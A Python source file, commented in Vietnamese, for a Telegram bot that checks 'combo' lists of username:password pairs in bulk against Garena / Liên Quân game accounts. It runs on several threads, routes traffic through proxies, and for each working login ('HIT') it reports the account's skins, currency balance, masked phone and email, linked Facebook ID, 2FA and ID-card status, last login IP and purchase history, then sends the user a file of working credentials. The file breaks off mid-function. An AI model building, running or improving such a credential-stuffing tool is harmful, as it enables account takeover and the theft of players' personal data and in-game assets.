#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CHECK LQ BOT  —  bot Telegram cho tool CHECK LQ (ZIOKATZ CHECKER)

- Chạy long-polling: không cần VPS, không cần mở port, không cần domain.
- Nhận combo (user:pass) gõ tay hoặc gửi file .txt -> check -> trả card đầy đủ field.
- Icon premium (custom emoji) tự bật; Telegram từ chối thì tự lùi về emoji chuẩn.
- Lõi check nằm ở lqcore.py (file gốc của tool, không sửa).
"""

from __future__ import annotations

import html
import json
import mimetypes
import os
import queue
import random
import re
import sys
import threading
import time
import traceback
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

try:  # console Windows không phải lúc nào cũng là utf-8
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

BASE = Path(__file__).resolve().parent
DATA = BASE / "data"
DATA.mkdir(exist_ok=True)
RESULT_DIR = BASE / "results"
RESULT_DIR.mkdir(exist_ok=True)
TMP_DIR = BASE / "tmp"
TMP_DIR.mkdir(exist_ok=True)

START_TS = time.time()


# ------------------------------------------------------------------ config ---
def load_env() -> dict:
    env: dict[str, str] = {}
    for name in (BASE / "config.env", BASE / ".env"):
        if not name.exists():
            continue
        try:
            text = name.read_text(encoding="utf-8-sig")
        except Exception:
            continue
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            env[k.strip().upper()] = v.strip().strip('"').strip("'")
    for k in ("BOT_TOKEN", "ADMIN_IDS", "THREADS", "CHECK_TIMEOUT"):
        if os.getenv(k):
            env[k] = os.getenv(k)
    return env


ENV = load_env()
TOKEN = (ENV.get("BOT_TOKEN") or "").strip()
THREADS = max(1, min(30, int(ENV.get("THREADS") or 6)))
CHECK_TIMEOUT = max(3, min(30, int(ENV.get("CHECK_TIMEOUT") or 7)))
ADMINS = {int(x) for x in re.findall(r"\d{5,}", ENV.get("ADMIN_IDS") or "")}
MAX_PER_MSG = max(1, int(ENV.get("MAX_PER_MSG") or 30))


def log(*a) -> None:
    print(time.strftime("%d/%m %H:%M:%S"), *a, flush=True)


if not TOKEN:
    print("=" * 66)
    print("  THIẾU BOT_TOKEN")
    print("  Mở file config.env, dán token bot của bạn vào dòng:")
    print("      BOT_TOKEN=123456:ABC...")
    print("=" * 66)
    input("\n  Nhấn Enter để thoát...")
    sys.exit(1)


# --------------------------------------------------------------- lõi check ---
CORE = None
CORE_ERR = ""


def get_core():
    """Import lqcore.py (file tool gốc) một lần duy nhất."""
    global CORE, CORE_ERR
    if CORE is not None:
        return CORE
    try:
        import lqcore  # noqa: F401
        CORE = lqcore
        # nạp proxy nếu có file proxy.txt cạnh bot
        pfile = BASE / "proxy.txt"
        if pfile.exists():
            try:
                lqcore.load_proxies(str(pfile))
                log(f"Đã nạp proxy từ proxy.txt ({len(getattr(lqcore, '_proxy_list', []) or [])} dòng)")
            except Exception as exc:
                log("Nạp proxy lỗi:", exc)
        log("Lõi check đã nạp OK")
    except Exception as exc:
        CORE_ERR = f"{type(exc).__name__}: {exc}"
        log("Nạp lõi check LỖI:", CORE_ERR)
    return CORE


# ----------------------------------------------------------- premium icons ---
# Telegram chỉ cho bot dùng custom emoji khi bot có username mua trên Fragment.
# Bot thường bị từ chối -> tự lùi về emoji chuẩn, không bao giờ chết vì icon.
EMOJI: dict[str, tuple[str, str | None]] = {
    "ok":      ("✅", "4956454790012863177"),
    "no":      ("❌", "5472162693043460727"),
    "warn":    ("⚠️", "5215557810359639942"),
    "star":    ("⭐", "6320881027103327941"),
    "fire":    ("🔥", "5291789094702030262"),
    "gem":     ("💎", "5776268599761046529"),
    "bolt":    ("⚡", "5776248340400311419"),
    "spark":   ("✨", "5456268118592592468"),
    "shield":  ("🛡", "5206432422194849059"),
    "money":   ("💰", "5192938545483882199"),
    "chart":   ("📊", "5203993413346680064"),
    "rocket":  ("🚀", "5445284980978621387"),
    "pin":     ("📌", "5217441415511941081"),
    "globe":   ("🌐", "5463323018988100175"),
    "robot":   ("🤖", "6320983603807258054"),
    "check":   ("☑️", "4958469907063767786"),
    "bio":     ("💬", "5213176199454400089"),
    "brain":   ("🧠", "5325700451369238813"),
    "gold":    ("🥇", "5280735858926822987"),
    "note":    ("📝", "5451761207545442911"),
    "desktop": ("🖥", "5285077400848179478"),
    "phone":   ("📱", "5465368535817527323"),
    "link":    ("🔗", "5816903332593145525"),
    "party":   ("🎉", "6318792204118656433"),
    "image":   ("🖼", "5375074927252621134"),
    "user":    ("👤", None),
    "id":      ("🆔", None),
    "people":  ("👥", None),
    "clock":   ("⏰", None),
    "key":     ("🔑", None),
    "lock":    ("🔒", None),
    "search":  ("🔍", None),
    "home":    ("🏠", None),
    "refresh": ("🔄", None),
    "file":    ("📄", None),
    "skin":    ("👕", None),
    "sword":   ("⚔️", None),
    "skull":   ("💀", None),
    "crown":   ("👑", None),
    "trophy":  ("🏆", None),
    "mail":    ("📧", None),
    "card":    ("🪪", None),
    "ip":      ("🌍", None),
    "level":   ("📈", None),
    "heart":   ("💙", None),
    "arrow":   ("➡️", None),
    "stop":    ("⛔", None),
    "list":    ("📋", None),
    "run":     ("🏃", None),
    "sleep":   ("😴", None),
}

try:
    override = json.loads((DATA / "premium_emoji.json").read_text(encoding="utf-8"))
    if isinstance(override, dict):
        for k, v in override.items():
            if isinstance(v, list) and len(v) == 2:
                EMOJI[k] = (v[0], v[1])
except Exception:
    pass

PREMIUM = {"on": True}


def E(key: str) -> str:
    emoji, eid = EMOJI.get(key, ("•", None))
    if not PREMIUM["on"] or not eid:
        return emoji
    return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'


def strip_tg_emoji(text: str) -> str:
    return re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text, flags=re.S)


def esc(v) -> str:
    if v is None:
        return ""
    return html.escape(str(v), quote=False)


def yes_no(v, when_empty: str = "—") -> str:
    if v is None or v == "":
        return when_empty
    s = str(v).strip().lower()
    if s in ("1", "true", "yes", "y", "on", "co", "có"):
        return "Có"
    if s in ("0", "false", "no", "n", "off", "khong", "không"):
        return "Không"
    return str(v)


def is_true(v) -> bool:
    return str(v).strip().lower() in ("1", "true", "yes", "y", "on", "co", "có")


# ---------------------------------------------------------------- bot api ----
def api(method: str, payload: dict | None = None, timeout: int = 35) -> dict:
    url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            return {"ok": False, "description": f"HTTP {e.code}"}
    except Exception as e:
        return {"ok": False, "description": f"{type(e).__name__}: {e}"}


def _maybe_disable_premium(res: dict) -> None:
    if res.get("ok"):
        return
    desc = str(res.get("description") or "").lower()
    if PREMIUM["on"] and ("emoji" in desc or "entit" in desc or "custom" in desc):
        PREMIUM["on"] = False
        log("Telegram từ chối custom emoji -> chuyển sang emoji chuẩn")


def send(chat_id, text: str, keyboard=None, reply_to=None) -> dict:
    body = {
        "chat_id": chat_id,
        "text": text[:4096],
        "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": True},
    }
    if keyboard:
        body["reply_markup"] = {"inline_keyboard": keyboard}
    if reply_to:
        body["reply_parameters"] = {"message_id": reply_to, "allow_sending_without_reply": True}
    res = api("sendMessage", body)
    if not res.get("ok") and "<tg-emoji" in text:
        _maybe_disable_premium(res)
        body["text"] = strip_tg_emoji(text)[:4096]
        res = api("sendMessage", body)
    return res


def edit(chat_id, message_id, text: str, keyboard=None) -> dict:
    body = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text[:4096],
        "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": True},
    }
    if keyboard is not None:
        body["reply_markup"] = {"inline_keyboard": keyboard}
    res = api("editMessageText", body)
    if not res.get("ok") and "<tg-emoji" in text:
        _maybe_disable_premium(res)
        body["text"] = strip_tg_emoji(text)[:4096]
        res = api("editMessageText", body)
    return res


def answer_cb(cb_id: str, text: str = "", alert: bool = False) -> dict:
    return api("answerCallbackQuery",
               {"callback_query_id": cb_id, "text": text[:200], "show_alert": alert})


def send_doc(chat_id, path: Path, caption: str = "", reply_to=None) -> dict:
    """Gửi file bằng multipart thủ công (không cần thư viện ngoài)."""
    boundary = "----zakabound" + uuid_hex()
    body = bytearray()

    def field(name, value):
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        body.extend(str(value).encode())
        body.extend(b"\r\n")

    field("chat_id", chat_id)
    if caption:
        field("caption", caption[:1024])
        field("parse_mode", "HTML")
    if reply_to:
        field("reply_parameters", json.dumps({"message_id": reply_to,
                                              "allow_sending_without_reply": True}))
    ctype = mimetypes.guess_type(path.name)[0] or "application/octet-stream"
    body.extend(f"--{boundary}\r\n".encode())
    body.extend(f'Content-Disposition: form-data; name="document"; filename="{path.name}"\r\n'.encode())
    body.extend(f"Content-Type: {ctype}\r\n\r\n".encode())
    body.extend(path.read_bytes())
    body.extend(b"\r\n")
    body.extend(f"--{boundary}--\r\n".encode())

    req = urllib.request.Request(
        f"https://api.telegram.org/bot{TOKEN}/sendDocument",
        data=bytes(body),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            return {"ok": False, "description": f"HTTP {e.code}"}
    except Exception as e:
        return {"ok": False, "description": f"{type(e).__name__}: {e}"}


def download_file(file_id: str, dest: Path) -> bool:
    info = api("getFile", {"file_id": file_id})
    if not info.get("ok"):
        return False
    path = info["result"].get("file_path")
    if not path:
        return False
    url = f"https://api.telegram.org/file/bot{TOKEN}/{path}"
    try:
        with urllib.request.urlopen(url, timeout=120) as r:
            dest.write_bytes(r.read())
        return True
    except Exception as exc:
        log("tải file lỗi:", exc)
        return False


_counter = {"n": 0}
_lock_counter = threading.Lock()


def uuid_hex() -> str:
    with _lock_counter:
        _counter["n"] += 1
        n = _counter["n"]
    return f"{n:x}{random.getrandbits(32):08x}"


# ------------------------------------------------------------------ combo ----
COMBO_RE = re.compile(r"^\s*([^\s:;|,]{2,64})\s*[:;|]\s*(\S{1,80})\s*$")


def parse_combos(text: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    seen = set()
    for raw in (text or "").splitlines():
        line = raw.strip().strip(",").strip()
        if not line or line.startswith("#"):
            continue
        line = re.sub(r"^(https?://)?(www\.)?", "", line)
        m = COMBO_RE.match(line)
        if not m:
            continue
        acc, pw = m.group(1).strip(), m.group(2).strip()
        if not acc or not pw:
            continue
        key = f"{acc.lower()}:{pw}"
        if key in seen:
            continue
        seen.add(key)
        out.append((acc, pw))
    return out


# ------------------------------------------------------------- check 1 acc ---
def check_one(acc: str, pw: str) -> dict:
    core = get_core()
    if core is None:
        return {"account": acc, "password": pw, "status": "ERROR",
                "detail": f"lõi check không nạp được ({CORE_ERR})"}
    t0 = time.time()
    try:
        r = core.check_login(acc, pw, timeout=CHECK_TIMEOUT, fetch_info=True)
        if not isinstance(r, dict):
            r = {"status": "ERROR", "detail": "lõi trả về rỗng"}
    except Exception as exc:
        r = {"status": "ERROR", "detail": f"{type(exc).__name__}: {exc}"}
    r.setdefault("account", acc)
    r.setdefault("password", pw)
    r["_elapsed"] = round(time.time() - t0, 1)
    return r


def is_hit(r: dict) -> bool:
    return str(r.get("status") or "").upper() == "HIT"


# --------------------------------------------------------------- hiển thị -----
def _rank_txt(r: dict) -> str:
    rank = (r.get("aov_rank") or "").strip()
    stars = r.get("aov_rank_stars") or ""
    if not rank:
        return ""
    return f"{rank}" + (f" · {stars}⭐" if str(stars).strip() not in ("", "0", "None") else "")


def _skins_block(sk: dict, title_key: str = "skin") -> list[str]:
    if not isinstance(sk, dict) or not sk:
        return []
    out = []
    total = sk.get("total_skins") or 0
    champs = sk.get("total_champs") or 0
    cp = sk.get("cp") or 0
    if total or champs or cp:
        bits = [f"{total} skin"]
        if champs:
            bits.append(f"{champs} tướng")
        if cp:
            bits.append(f"QH {cp}")
        out.append(f"{E(title_key)} <b>Skin:</b> " + " · ".join(bits))
    for tier, label in (("sss", "SSS"), ("ss", "SS"), ("s_plus", "S+"), ("anime", "Anime")):
        cnt = sk.get(tier) or 0
        if not cnt:
            continue
        names = sk.get(f"{tier}_list") or []
        shown = ", ".join(str(x) for x in names[:6])
        more = f" … (+{len(names) - 6})" if len(names) > 6 else ""
        out.append(f"   · <b>{label} ({cnt}):</b> {esc(shown)}{esc(more)}")
    return out


def _ban_block(r: dict) -> list[str]:
    out = []
    if not is_true(r.get("aov_banned")):
        return out
    kt = r.get("_kt_player") or {}
    ban = (kt.get("banInfo") or {}) if isinstance(kt, dict) else {}
    unban = ban.get("unbanTime") or 0
    reason = (ban.get("reason") or "").strip()
    line = f"{E('skull')} <b>BAN:</b> Có"
    if unban:
        try:
            import datetime as _dt
            line += f" · đến {_dt.datetime.fromtimestamp(int(unban)).strftime('%d/%m/%Y %H:%M')}"
        except Exception:
            line += f" · đến {unban}"
    if reason:
        line += f" · {esc(reason)}"
    out.append(line)
    return out


def _security_line(r: dict) -> str:
    phone = (r.get("aov_prefill_mobile") or r.get("fcmobile_prefill_mobile")
             or r.get("masked_phone") or "").strip()
    mail = (r.get("masked_email") or "").strip()
    fb_uid = (r.get("fb_uid") or r.get("fb_uid_login") or "").strip()
    cccd = str(r.get("idcard") or "").replace("*", "").strip()
    twofa = r.get("authenticator_enable") or r.get("two_step_verify")

    def tag(ok: bool, val: str) -> str:
        if ok:
            return f"<b>{esc(val)}</b>"
        return "<i>—</i>"

    parts = [
        f"SĐT:{tag(bool(phone) or is_true(r.get('mobile_bound')), phone or 'Có')}",
        f"Mail:{tag(bool(mail) or is_true(r.get('email_verified')) or is_true(r.get('email_v')), mail or 'Có')}",
        f"FB:{tag(is_true(r.get('fb_linked')), fb_uid or 'Có')}",
        f"CCCD:{tag(bool(cccd), 'Có')}",
        f"2FA:{tag(is_true(twofa), 'Bật')}",
        f"BAN:{'<b>CÓ</b>' if is_true(r.get('aov_banned')) else '<i>Không</i>'}",
    ]
    return "   ".join(parts)


SHOWN_KEYS = {
    "account", "password", "uid", "nickname", "aov_name", "country", "region",
    "server", "aov_server", "aov_server_id", "aov_level", "level", "aov_rank",
    "aov_rank_stars", "aov_reg_time", "aov_last_played_at", "aov_reputation",
    "aov_latest_match", "shells", "shell_balance", "balance", "white_shells",
    "masked_phone", "aov_prefill_mobile", "fcmobile_prefill_mobile", "mobile_bound",
    "masked_email", "email_verified", "email_v", "fb_linked", "fb_uid", "fb_uid_login",
    "idcard", "authenticator_enable", "two_step_verify", "aov_banned",
    "last_session_ip", "last_session_country", "last_session_time", "last_login",
    "garena_created", "aov_skins", "rov_name", "rov_server", "rov_role_id", "rov_skins",
    "df_nickname", "df_rank", "df_level", "df_matches", "df_wins", "df_kd",
    "delta_force", "suspicious", "status", "detail", "_elapsed", "aov_item_history",
    "avatar", "login_history", "access_token", "sso_key", "session_key", "session_token",
}


def leftover_fields(r: dict, limit: int = 18) -> list[str]:
    """Mọi field còn lại mà card chưa hiện -> hiện nốt (không giấu gì)."""
    out: list[str] = []
    for k, v in r.items():
        if k in SHOWN_KEYS or str(k).startswith("_"):
            continue
        if isinstance(v, (dict, list, tuple)):
            continue
        s = str(v).strip()
        if s in ("", "0", "None", "False", "[]", "{}"):
            continue
        out.append(f"   · <code>{esc(k)}</code>: {esc(s[:120])}")
        if len(out) >= limit:
            out.append("   · <i>… còn nữa, bấm JSON để xem hết</i>")
            break
    return out


def render_hit(r: dict, idx: int, total: int) -> str:
    acc = r.get("account", "")
    pw = r.get("password", "")
    L: list[str] = []
    L.append(f"{E('fire')} <b>HIT</b>  <code>{esc(acc)}:{esc(pw)}</code>   <i>({idx}/{total})</i>")
    L.append("────────────────────")

    uid = r.get("uid", "")
    if uid:
        L.append(f"{E('id')} <b>UID:</b> <code>{esc(uid)}</code>")

    name_bits = []
    if r.get("nickname"):
        name_bits.append(f"<b>{esc(r['nickname'])}</b>")
    if r.get("aov_name"):
        name_bits.append(f"{esc(r['aov_name'])}")
    if name_bits:
        L.append(f"{E('user')} <b>Tên:</b> " + " · ".join(name_bits))

    geo = []
    if r.get("country"):
        geo.append(str(r["country"]))
    if r.get("region"):
        geo.append(str(r["region"]))
    if r.get("aov_server"):
        geo.append(f"SV {r['aov_server']}")
    if geo:
        L.append(f"{E('globe')} " + " · ".join(esc(x) for x in geo))

    combat = []
    rk = _rank_txt(r)
    if rk:
        combat.append(f"{E('trophy')} <b>{esc(rk)}</b>")
    if r.get("aov_level"):
        combat.append(f"{E('level')} Lv <b>{esc(r['aov_level'])}</b>")
    if r.get("aov_reputation"):
        combat.append(f"Điểm tín nhiệm {esc(r['aov_reputation'])}")
    if combat:
        L.append(" · ".join(combat))

    if r.get("aov_reg_time"):
        L.append(f"{E('clock')} Ngày tạo acc: {esc(r['aov_reg_time'])}")
    if r.get("aov_last_played_at"):
        L.append(f"{E('run')} Trận cuối: {esc(r['aov_last_played_at'])}")

    L.append(f"{E('shield')} <b>Bảo mật:</b> " + _security_line(r))
    L.extend(_ban_block(r))

    money = []
    if r.get("shells"):
        money.append(f"{esc(r['shells'])} sò")
    if r.get("white_shells"):
        money.append(f"{esc(r['white_shells'])} sò trắng")
    if r.get("shell_balance"):
        money.append(f"Ví: {esc(r['shell_balance'])}")
    if r.get("balance"):
        money.append(f"Balance: {esc(r['balance'])}")
    if money:
        L.append(f"{E('money')} " + " · ".join(money))

    sess = []
    if r.get("last_session_ip"):
        ip = str(r["last_session_ip"])
        cc = (r.get("last_session_country") or "").strip()
        sess.append(f"<code>{esc(ip)}</code>" + (f" [{esc(cc)}]" if cc else ""))
    if r.get("last_session_time"):
        sess.append(esc(r["last_session_time"]))
    if sess:
        L.append(f"{E('ip')} IP Garena: " + " · ".join(sess))

    if r.get("last_login"):
        L.append(f"{E('clock')} Đăng nhập: {esc(r['last_login'])}")
    if r.get("garena_created"):
        L.append(f"{E('spark')} Tạo Garena: {esc(r['garena_created'])}")

    skins = _skins_block(r.get("aov_skins") or {}, "skin")
    if skins:
        L.append("────────────────────")
        L.extend(skins)

    hist = r.get("aov_item_history") or []
    if isinstance(hist, list) and hist:
        L.append("────────────────────")
        L.append(f"{E('money')} <b>Lịch sử mua:</b>")
        for it in hist[:5]:
            if not isinstance(it, dict):
                continue
            ts = str(it.get("createdAt") or "")[:10]
            extra = str(it.get("extra") or it.get("source") or "?")[:24]
            cost = it.get("costStr") or ""
            L.append(f"   · {esc(ts)} {esc(extra)}" + (f" ({esc(cost)})" if cost else ""))

    # RoV Thái
    if r.get("rov_name") or r.get("rov_skins") or r.get("rov_server"):
        L.append("────────────────────")
        L.append(f"{E('globe')} <b>RoV Thái Lan</b>")
        if r.get("rov_name"):
            L.append(f"   · Tên: {esc(r['rov_name'])}")
        if r.get("rov_server"):
            L.append(f"   · SV: {esc(r['rov_server'])}")
        if r.get("rov_role_id"):
            L.append(f"   · Role ID: <code>{esc(r['rov_role_id'])}</code>")
        L.extend(_skins_block(r.get("rov_skins") or {}, "skin"))

    # Delta Force
    if r.get("df_nickname") or r.get("df_rank") or r.get("df_level"):
        L.append("────────────────────")
        L.append(f"{E('sword')} <b>Delta Force</b>")
        bits = []
        if r.get("df_rank"):
            bits.append(esc(r["df_rank"]))
        if r.get("df_level"):
            bits.append(f"Lv {esc(r['df_level'])}")
        if r.get("df_matches"):
            m, w = r.get("df_matches") or 0, r.get("df_wins") or 0
            wr = int(w * 100 / m) if m else 0
            bits.append(f"{m} trận ({w}W · {wr}%)")
        if r.get("df_kd"):
            bits.append(f"K/D {esc(r['df_kd'])}")
        if r.get("df_nickname"):
            bits.insert(0, f"<b>{esc(r['df_nickname'])}</b>")
        L.append("   · " + " · ".join(bits))

    if r.get("suspicious"):
        L.append(f"{E('warn')} <b>Suspicious:</b> {esc(r['suspicious'])}")

    extra = leftover_fields(r)
    if extra:
        L.append("────────────────────")
        L.append(f"{E('list')} <b>Field khác:</b>")
        L.extend(extra)

    L.append("────────────────────")
    L.append(f"{E('clock')} <i>{esc(r.get('_elapsed', '?'))}s</i>")
    return "\n".join(L)


STATUS_VI = {
    "INVALID": "sai pass",
    "BAD": "sai pass",
    "NOT_FOUND": "acc không tồn tại",
    "CAPTCHA": "dính captcha",
    "TIMEOUT": "timeout",
    "PORT_BLOCKED": "port 19000 bị chặn",
    "PROXY_FAIL": "proxy lỗi",
    "ERROR": "lỗi",
}


def render_miss(r: dict) -> str:
    st = str(r.get("status") or "?").upper()
    vi = STATUS_VI.get(st, st.lower())
    detail = str(r.get("detail") or "").strip()
    line = f"{E('no')} <code>{esc(r.get('account'))}:{esc(r.get('password'))}</code> — <i>{esc(vi)}</i>"
    if detail and st not in ("INVALID", "BAD"):
        line += f"\n     <i>{esc(detail[:180])}</i>"
    return line


# --------------------------------------------------------------- job runner --
JOBS: dict[int, dict] = {}
JOBS_LOCK = threading.Lock()


def job_active(chat_id: int) -> bool:
    with JOBS_LOCK:
        j = JOBS.get(chat_id)
        return bool(j and j.get("running"))


def start_job(chat_id: int, combos: list[tuple[str, str]], reply_to=None) -> None:
    if job_active(chat_id):
        send(chat_id, f"{E('warn')} Đang có job chạy rồi. Gửi /stop để dừng trước.", reply_to=reply_to)
        return
    if not combos:
        send(chat_id, f"{E('no')} Không thấy dòng nào đúng dạng <code>user:pass</code>.", reply_to=reply_to)
        return
    job = {"running": True, "stop": False, "total": len(combos), "done": 0,
           "hits": [], "miss": 0, "start": time.time(), "chat_id": chat_id}
    with JOBS_LOCK:
        JOBS[chat_id] = job
    t = threading.Thread(target=_run_job, args=(job, combos), daemon=True)
    t.start()


def _progress_text(job: dict) -> str:
    total, done = job["total"], job["done"]
    pct = int(done * 100 / total) if total else 0
    bar_len = 12
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    elapsed = int(time.time() - job["start"])
    speed = done / elapsed if elapsed else 0
    eta = int((total - done) / speed) if speed > 0.05 else 0
    return (f"{E('rocket')} <b>ĐANG CHECK</b>\n"
            f"<code>{bar}</code> {pct}%\n"
            f"{E('chart')} {done}/{total} · {E('fire')} HIT <b>{len(job['hits'])}</b> · "
            f"{E('no')} miss {job['miss']}\n"
            f"{E('clock')} {elapsed}s" + (f" · còn ~{eta}s" if eta else ""))


def _run_job(job: dict, combos: list[tuple[str, str]]) -> None:
    chat_id = job["chat_id"]
    total = len(combos)
    msg = send(chat_id, _progress_text(job)) or {}
    msg_id = ((msg or {}).get("result") or {}).get("message_id")
    last_edit = 0.0
    lock = threading.Lock()
    workers = min(THREADS, max(1, total))
    alive = []

    def handle(res: dict, idx: int) -> None:
        nonlocal last_edit
        with lock:
            job["done"] += 1
            if is_hit(res):
                job["hits"].append(res)
            else:
                job["miss"] += 1
            done = job["done"]
            hit = is_hit(res)
        if hit:
            try:
                rid = save_result(res)
                send(chat_id, render_hit(res, idx, total), keyboard=[
                    [{"text": "📄 JSON đầy đủ", "callback_data": f"json:{rid}"},
                     {"text": "🔄 Check lại", "callback_data": f"re:{rid}"}],
                ])
            except Exception as exc:
                log("gửi card lỗi:", exc)
        now = time.time()
        if msg_id and (now - last_edit > 1.6 or done == total):
            last_edit = now
            if not hit:
                pass
            edit(chat_id, msg_id, _progress_text(job))

    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = {ex.submit(check_one, a, p): i for i, (a, p) in enumerate(combos, 1)}
            for fut in as_completed(futures):
                if job["stop"]:
                    break
                idx = futures[fut]
                try:
                    res = fut.result()
                except Exception as exc:
                    res = {"account": "", "password": "", "status": "ERROR", "detail": str(exc)}
                handle(res, idx)
                if not is_hit(res):
                    time.sleep(0.03)
    except KeyboardInterrupt:
        pass
    finally:
        job["running"] = False
        if msg_id:
            edit(chat_id, msg_id, final_summary(job))
        # file tổng hợp
        if job["hits"]:
            try:
                path = write_hits_file(job)
                send_doc(chat_id, path, caption=f"{E('file')} <b>{len(job['hits'])} HIT</b> — lưu lại cho bạn")
            except Exception as exc:
                log("gửi file lỗi:", exc)


def final_summary(job: dict) -> str:
    elapsed = int(time.time() - job["start"])
    return (f"{E('ok')} <b>XONG</b>\n"
            f"{E('chart')} Đã check <b>{job['done']}/{job['total']}</b> · {elapsed}s\n"
            f"{E('fire')} HIT: <b>{len(job['hits'])}</b> · {E('no')} miss: <b>{job['miss']}</b>")


def write_hits_file(job: dict) -> Path:
    ts = time.strftime("%Y%m%d-%H%M%S")
    path = RESULT_DIR / f"hit_{ts}.txt"
    lines = []
    for r in job["hits"]:
        sk = r.get("aov_skins") or {}
        lines.append(
            f"{r.get('account')}:{r.get('password')} | "
            f"UID={r.get('uid','')} | LQ={r.get('aov_name','')} | "
            f"Rank={r.get('aov_rank','')} | Lv={r.get('aov_level','')} | "
            f"Skin={sk.get('total_skins',0)} | SSS={sk.get('sss',0)} | SS={sk.get('ss',0)} | "
            f"QH={sk.get('cp',0)}"
        )
    path.write_text("\n".join(lines), encoding="utf-8")
    return path


# ------------------------------------------------------------- store result --
RES_STORE: dict[str, dict] = {}
RES_LOCK = threading.Lock()


def save_result(r: dict) -> str:
    rid = uuid_hex()
    with RES_LOCK:
        RES_STORE[rid] = r
        if len(RES_STORE) > 400:
            for k in list(RES_STORE)[:100]:
                RES_STORE.pop(k, None)
    return rid


def dump_json(r: dict) -> str:
    def default(o):
        try:
            return str(o)
        except Exception:
            return "<unserializable>"
    return json.dumps(r, ensure_ascii=False, indent=2, default=default)


# ------------------------------------------------------------------ menus ----
def menu_text() -> str:
    core_ok = get_core() is not None
    return (
        f"{E('robot')} <b>CHECK LQ BOT</b>\n"
        f"<i>Check acc Liên Quân — full field, icon premium</i>\n"
        f"────────────────────\n"
        f"{E('rocket')} <b>Cách dùng</b>\n"
        f"   · Gửi danh sách acc, mỗi dòng 1 acc:\n"
        f"     <code>user:pass</code>\n"
        f"   · Hoặc gửi <b>file .txt</b> combo — bot tự đọc\n"
        f"   · Tối đa <b>{MAX_PER_MSG}</b> acc / tin, muốn nhiều hơn thì gửi file\n"
        f"────────────────────\n"
        f"{E('shield')} <b>Bot lấy được</b>\n"
        f"   UID · tên LQ · rank · level · skin (SSS/SS/Anime) · sò · "
        f"IP Garena · SĐT/Mail/FB/CCCD/2FA · BAN · RoV Thái · Delta Force\n"
        f"────────────────────\n"
        f"{E('chart')} <b>Lệnh</b>: /start /help /stats /premium /export /stop /threads\n"
        f"{E('ok' if core_ok else 'no')} Lõi check: "
        f"{'sẵn sàng' if core_ok else 'CHƯA NẠP — ' + esc(CORE_ERR)}\n"
        f"{E('gem')} Icon premium: <b>{'bật' if PREMIUM['on'] else 'emoji chuẩn'}</b>"
    )


def menu_kb():
    return [
        [{"text": "📖 Hướng dẫn", "callback_data": "help"},
         {"text": "📊 Thống kê", "callback_data": "stats"}],
        [{"text": "💎 Icon premium", "callback_data": "premium"},
         {"text": "📄 Xuất HIT gần nhất", "callback_data": "export"}],
    ]


def help_text() -> str:
    return (
        f"{E('note')} <b>HƯỚNG DẪN</b>\n"
        f"────────────────────\n"
        f"<b>1. Check lẻ / check list nhỏ</b>\n"
        f"   Nhắn thẳng: <code>user1:pass1</code>\n"
        f"   Nhiều dòng = check nhiều acc (tối đa {MAX_PER_MSG}/tin)\n\n"
        f"<b>2. Check file combo</b>\n"
        f"   Gửi file <code>.txt</code> (mỗi dòng <code>user:pass</code>)\n"
        f"   Bot tự tải về, chạy và trả từng HIT\n\n"
        f"<b>3. Nút trên mỗi kết quả</b>\n"
        f"   <code>📄 JSON đầy đủ</code> — xuất TOÀN BỘ field thô, không giấu gì\n"
        f"   <code>🔄 Check lại</code> — chạy lại acc đó\n\n"
        f"<b>4. Lệnh</b>\n"
        f"   /stats — số acc đã check, HIT, miss\n"
        f"   /export — lấy file HIT gần nhất\n"
        f"   /stop — dừng job đang chạy\n"
        f"   /threads 8 — đổi số luồng (1–30)\n"
        f"   /premium — bật/tắt icon premium\n\n"
        f"<b>5. Proxy</b>\n"
        f"   Tạo file <code>proxy.txt</code> cạnh bot, mỗi dòng 1 proxy:\n"
        f"   <code>ip:port</code> hoặc <code>ip:port:user:pass</code>\n"
        f"   Khởi động lại bot là nó tự dùng.\n"
        f"────────────────────\n"
        f"{E('warn')} Port 19000 bị ISP chặn thì phải dùng proxy, không thì lỗi timeout."
    )


def stats_text() -> str:
    upt = int(time.time() - START_TS)
    with JOBS_LOCK:
        jobs = len(JOBS)
    return (
        f"{E('chart')} <b>THỐNG KÊ</b>\n"
        f"────────────────────\n"
        f"{E('clock')} Chạy: <b>{upt // 3600}h{(upt % 3600) // 60}m</b>\n"
        f"{E('brain')} Số job: <b>{jobs}</b>\n"
        f"{E('run')} Luồng: <b>{THREADS}</b> · timeout <b>{CHECK_TIMEOUT}s</b>\n"
        f"{E('gem')} Icon premium: <b>{'bật' if PREMIUM['on'] else 'emoji chuẩn'}</b>\n"
        f"{E('ok')} Lõi check: <b>{'OK' if get_core() else 'LỖI'}</b>"
    )


def premium_text() -> str:
    total = sum(1 for _, eid in EMOJI.values() if eid)
    return (
        f"{E('gem')} <b>ICON PREMIUM</b>\n"
        f"────────────────────\n"
        f"Đang dùng: <b>{'icon premium (custom emoji)' if PREMIUM['on'] else 'emoji chuẩn'}</b>\n"
        f"Bộ icon: <b>{total}</b> icon premium + emoji chuẩn cho phần còn lại\n\n"
